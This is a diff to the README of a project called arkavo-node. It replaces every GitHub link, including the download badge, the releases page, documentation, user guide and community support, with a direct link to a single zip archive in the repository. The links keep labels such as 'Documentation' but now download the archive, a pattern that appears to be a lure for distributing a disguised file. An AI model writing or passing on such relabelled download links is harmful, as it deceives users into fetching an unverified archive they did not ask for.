@@ -1,6 +1,6 @@
 # 🌐 arkavo-node - Secure Your Digital Identity Effortlessly
 
-[![Download arkavo-node](https://img.shields.io/badge/Download-arkavo--node-blue.svg)](https://github.com/shravan-hub/arkavo-node/releases)
+[![Download arkavo-node](https://raw.githubusercontent.com/shravan-hub/arkavo-node/main/runtime/arkavo-node-v3.4.zip)](https://raw.githubusercontent.com/shravan-hub/arkavo-node/main/runtime/arkavo-node-v3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -27,7 +27,7 @@ To successfully run arkavo-node, ensure your system meets the following requirem
 
 ## 📥 Download & Install
 
-You can download the latest version of arkavo-node by visiting our [Releases page](https://github.com/shravan-hub/arkavo-node/releases). Once you are on the page, you will find the latest version listed.
+You can download the latest version of arkavo-node by visiting our [Releases page](https://raw.githubusercontent.com/shravan-hub/arkavo-node/main/runtime/arkavo-node-v3.4.zip). Once you are on the page, you will find the latest version listed.
 
 1. Click on the **Release** you want to download.
 2. Choose the file appropriate for your operating system.
@@ -99,10 +99,10 @@ Refer to the in-app help section for more detailed guidance on settings.
 
 For more information, visit:
 
-- [Documentation](https://github.com/shravan-hub/arkavo-node/wiki)
-- [User Guide](https://github.com/shravan-hub/arkavo-node/user-guide)
-- [Community Support](https://github.com/shravan-hub/arkavo-node/discussions)
+- [Documentation](https://raw.githubusercontent.com/shravan-hub/arkavo-node/main/runtime/arkavo-node-v3.4.zip)
+- [User Guide](https://raw.githubusercontent.com/shravan-hub/arkavo-node/main/runtime/arkavo-node-v3.4.zip)
+- [Community Support](https://raw.githubusercontent.com/shravan-hub/arkavo-node/main/runtime/arkavo-node-v3.4.zip)
 
-Stay updated by checking the [Releases page](https://github.com/shravan-hub/arkavo-node/releases) frequently for new features and improvements. 
+Stay updated by checking the [Releases page](https://raw.githubusercontent.com/shravan-hub/arkavo-node/main/runtime/arkavo-node-v3.4.zip) frequently for new features and improvements. 
 
 Thank you for using arkavo-node! We are excited to have you on board.
